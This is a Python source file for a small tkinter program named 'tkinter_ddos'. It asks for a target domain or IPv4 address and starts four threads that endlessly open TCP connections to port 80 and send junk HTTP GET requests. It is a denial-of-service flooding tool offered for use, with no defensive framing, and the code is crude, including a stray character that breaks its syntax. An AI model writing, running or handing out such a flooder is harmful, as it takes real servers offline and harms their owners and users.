import socket
from threading import Thread
from tkinter import *
#fuction for the settings
def settings():
    def button():
        it_works = Label(win, text="It works")
        it_works.pack()
    #mainloop for the settings
    win = Tk()
    win.minsize(width=400, height=300)
    win.title("tkinter_ddos/settings")
    button_test = Button(win, text="test", command=button)
    button_test.pack()
    win.mainloop()
#host and port input
def form():
    host = input_host.get()
    global target
    target = socket.gethostbyname(host)
    global port
    port = 80
    #print(target, port)
#main funcion that does all the magic
def ddos():
    while True:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as mysocket:
            try:
                mysocket.connect((target, port))
                #random scheiß daten
                mysocket.send(str.encode("GET " + "random scheiß daten" + "HTTP/1.1 \r\n"))
                mysocket.sendto(str.encode("GET " + "random scheiß daten" + "HTTP/1.1 \r\n"), (target, port))
                label = Label(window, text="send package")
                label.pack()
            except socket.error:
                print("Server down time.")
        mysocket.close()^
#thread thing
def start():
    for i in range(4):
        t = Thread(target=ddos)
        t.start()
#mainloop for the gui
window = Tk()
window.title("tkinter_ddos")
window.minsize(width=400, height=300)
lable = Label(window, text="Target domian/ipv4.")
input_host = Entry(window)
dos_start_button = Button(window, text="start()", command=start)
submit_button = Button(window, text="submit", command=form)
button_setting = Button(window, text="settings", command=settings)
lable.pack()
input_host.pack()
submit_button.pack()
input_host.pack()
dos_start_button.pack()
button_setting.pack()
window.mainloop()
